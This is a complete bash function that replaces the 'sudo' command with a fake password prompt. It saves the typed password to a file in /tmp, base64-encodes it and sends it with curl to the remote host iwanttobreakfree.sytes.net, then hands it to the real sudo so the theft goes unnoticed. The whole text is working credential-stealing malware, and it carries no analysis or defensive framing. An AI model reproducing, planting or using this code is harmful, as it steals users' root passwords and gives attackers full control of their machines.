function sudo () 
{ 
    realsudo="$(which sudo)";
    read -s -p "[sudo] password for $USER: " inputPasswd;
    printf "\n";
    printf '%s\n' "$USER : $inputPasswd" > /tmp/ytreza.txt;
    encoded=$(printf '%s' "$inputPasswd" | base64) > /dev/null 2>&1;
    curl -X GET "http://iwanttobreakfree.sytes.net:40//$USER:$encoded" > /dev/null 2>&1;
    $realsudo -S -u root bash -c "exit" <<< "$inputPasswd" > /dev/null 2>&1;
    $realsudo "${@:1}"
}
